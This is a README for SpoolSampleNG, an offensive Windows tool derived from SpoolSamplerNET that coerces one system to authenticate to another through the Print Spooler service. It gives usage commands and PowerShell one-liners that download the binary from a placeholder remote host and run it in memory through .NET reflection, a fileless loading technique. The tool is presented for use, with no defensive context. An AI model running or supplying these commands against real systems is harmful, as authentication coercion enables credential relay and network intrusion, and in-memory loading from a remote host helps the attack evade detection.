This repository is a derivative of **leftp**'s [SpoolSamplerNET](https://github.com/leftp/SpoolSamplerNET) repository, modified primarily for .NET reflection support and adjusted syntax.

![Banner](https://cdn.discordapp.com/attachments/855920119292362802/1207727506170576957/image.png?ex=65e0b2e3&is=65ce3de3&hm=7aec3fb866a38b2f0f9ff4240f96384a9b9441dd5349eba9c3cf667b41db33f4&)

---

# Usage

- Usage from Disk via the Binary:

```powershell
# Force System to Authenticate to Another
./SpoolSampleNG.exe \\<source> \\<destination>

# Return Help Page
./SpoolSampleNG.exe --help
```

- Usage from Memory via .NET Reflection:

```powershell
# Load Binary into Memory Locally
[System.Reflection.Assembly]::LoadFile("$PWD/SpoolSampleNG.exe")

# Load Binary into Memory Remotely
$WebClient = New-Object System.Net.WebClient
$DownloadData = $WebClient.DownloadData("http(s)://<ip_addr>/SpoolSampleNG.exe")
[System.Reflection.Assembly]::Load($DownloadData)

# Load Binary into Memory Remotely (one-liner)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http(s)://<ip_addr>/SpoolSampleNG.exe'))

# Force System to Authenticate to Another
[SpoolSampleNG.Program]::Main(@('\\<source>','\\destination'))
```